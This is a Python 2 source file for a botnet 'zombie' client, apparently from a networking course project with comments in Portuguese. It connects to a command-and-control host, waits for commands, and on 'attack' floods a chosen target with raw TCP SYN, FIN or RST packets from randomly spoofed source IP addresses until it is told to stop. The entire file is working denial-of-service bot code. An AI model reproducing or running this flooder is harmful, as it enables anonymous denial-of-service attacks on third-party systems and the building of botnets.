#coding: utf-8
from os import fork
import sys
from time import sleep
import socket
from struct import *
from random import randint,randrange
from multiprocessing import Process


# Funcao de spoof IP address
def get_random_ip():
    not_valid = [10, 127, 169, 172, 192]

    first = randrange(1, 256)
    while first in not_valid:
        first = randrange(1, 256)

    return ".".join([str(first), str(randrange(1, 256)),
                     str(randrange(1, 256)),
                     str(randrange(1, 256))])

# Funcoes auxiliares para calculo do checksum
def carry_around_add(a_op, b_op):
    carry = a_op + b_op
    return (carry & 0xffff) + (carry >> 16)

def checksum(msg):
    csum = 0
    if len(msg) % 2 != 0:
        msg += "\x00"
    for i in range(0, len(msg), 2):
        j = ord(msg[i]) + (ord(msg[i+1]) << 8)
        csum = carry_around_add(csum, j)
    return ~csum & 0xffff


# Criacao de um RAW Socket
def cria_raw_socket():
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        return raw_socket
    except socket.error, msg:
        #print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # Para calculo do checksum tcp+ip, eh montado um cabecalho especial
    # Obs: ver em http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
def checksum_tcp(source_ip, dest_ip, tcp_header):

    # Campos do Pseudo-Cabecalho
    source_address = socket.inet_aton( source_ip )
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    return checksum(psh)

def monta_pacote(seqnumber, attack_type, source_ip, dest_ip, source_port, dest_port, window_size, id):
    # Construcao do pacote
    packet = ''

    # ======== Campos do cabecalho IP ========

    # Tamanho do header (a ser calculado)
    ihl = 5

    # Versao do protocolo (IPv4)
    version = 4

    # Tipo de Servico
    tos = 0

    # Tamanho total (Python corrige no momento do envio)
    tot_len = 0

    # Identificador do pacote
    id = id

    # Offset Fragmentacao
    frag_off = 0

    # 'Time-to-live'
    ttl = 255

    # Protocolo utilizado (TCP)
    protocol = socket.IPPROTO_TCP

    # Checksum do header (Valor aleatorio p/ desabilitar validacao)
    check = 10

    # IP's de origem e destino.
    # inet_aton converte a notacao numeros-e-pontos em binario (network byte order)
    saddr = socket.inet_aton(source_ip)
    daddr = socket.inet_aton(dest_ip)

    # Calculo do tamanho do header. Ipv4 = 64 + ihl, Ipv6 = 96 + ihl
    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off,
                     ttl, protocol, check, saddr, daddr)

    # ======== Campos do cabecalho TCP ========

    # Porta de origem
    source = source_port

    # Porta de destino
    dest = dest_port

    # Sequence Number
    seq = seqnumber

    # ACK Sequence
    ack_seq = 0

    # Data Offset
    doff = 5

    # Flags de controle
    fin = int(attack_type == "FIN")
    syn = int(attack_type == "SYN")
    rst = int(attack_type == "RST")
    psh = 0
    ack = 0
    urg = 0

    # Juncao das flags em apenas um numero binario
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    # Tamanho da janela (utilizando tamanho máximo permitido)
    # htons = host to network short
    window = socket.htons(window_size)

    # Checksum (a ser calculado)
    check = 0

    # Urgent Pointer (zero)
    urg_ptr = 0

    # Reservado
    offset_res = (doff << 4) + 0

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res,
                      tcp_flags, window, check, urg_ptr)

    # Cálculo do checksum do cabecalho TCP (no caso, do pseudo-cabecalho + header tcp)
    tcp_checksum = checksum_tcp(source_ip, dest_ip, tcp_header)

    # Repete o enpacotamento do cabecalho com o checksum calculado
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res,
                      tcp_flags, window, tcp_checksum, urg_ptr)

    # Pacote final sao os dois headers, pois pacotes SYN nao possuem campo de dados
    packet = ip_header + tcp_header

    return packet
# ============================================================================================

def receivemessage(socket):
    data = socket.recv(1024)
    if not data :
        sys.exit()
    return data

def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
    #print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
    i = 0
    while 1:
        if attack_type == "RST" and i % 2 == 0:
            attack_type == "FIN"

        if attack_type == "FIN" and i % 2 != 0:
            attack_type == "RST"

        packet = monta_pacote(0, attack_type, get_random_ip(), dest_ip,
                              randint(1800, 65533), int(dest_port), 5840, 54321)

        raw_socket.sendto(packet, (dest_ip, int(dest_port)))
        i += 1
        #TODO: retirar esse sleep na apresentacao
        #sleep(1)
        #print "sending attack"


#comando para ver processos: ps -eo pid,ppid,stat,cmd
#comando mais simples: top
#pid = fork()
pid = 1
if pid == 0:
    sys.exit()
else:
    #print "Parent: I created a child and all i want to do is fude..."
    if len(sys.argv) < 3:
        #print 'Usage : python zombie.py hostname port'
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(None)
    # connect to remote host
    try:
        s.connect((host, port))
    except :
        #print 'Unable to connect'
        sys.exit()

    #print 'Connected to remote host'
    alive = 1

    # Obtenção do ip local
    local_ip =  s.getsockname()[0]
    local_port = s.getsockname()[1]

    # Cria o RAW Socket
    raw_s = cria_raw_socket()
    # Avisa o kernel para nao adicionar headers automaticamente
    raw_s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # Contadores do programa
    try:
        while alive:
            pkt_counter = 0
            data = receivemessage(s)
            #print data
            data2 = data.rstrip()
            # Comando 'se mata'
            if data2 == "die":
                alive = 0
            # Comando de ataque
            if data2.startswith("attack"):
                attack_type = data2.split()[1]
                dest_ip = data2.split()[2]
                dest_port = data2.split()[3]
                # Novo processo para ataque
                try:
                    proc = Process(target=attack,args=(raw_s,attack_type,local_ip,dest_ip,dest_port))
                    proc.start()
                    # TODO: Fechar iteration aqui
                    signal = receivemessage(s)
                    if signal.rstrip() == "stop":
                        proc.terminate()
            #print "======= Stop attacking! ========="
                except:
                    alive = 0
                    #print "Error: unable to start process"
            # Comando de parada sem estar atacando
            if data2 == "stop":
                alive = 1
                #print "Stop attacking"

    # Fim do programa
        #print "Disconnecting..."
        s.send("die")
        sys.exit()
    except KeyboardInterrupt:
    # Fim do programa forçado
        #print "Disconnecting..."
        s.send("die")
        sys.exit()
